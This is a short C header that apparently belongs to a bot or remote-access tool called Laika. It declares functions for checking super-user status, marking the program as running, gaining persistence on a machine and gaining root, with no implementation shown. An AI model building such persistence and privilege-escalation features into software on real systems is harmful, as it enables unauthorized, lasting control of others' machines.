#ifndef LAIKA_PERSIST_H
#define LAIKA_PERSIST_H

#include "lconfig.h"

#include <stdbool.h>

/* check if laika is running as super-user */
bool laikaB_checkRoot(void);

/* mark that laika is currently running */
void laikaB_markRunning(void);

/* unmark that laika is currently running */
void laikaB_unmarkRunning(void);

/* try to gain persistance on machine */
void laikaB_tryPersist(void);

/* try to gain root */
void laikaB_tryRoot(void);

#endif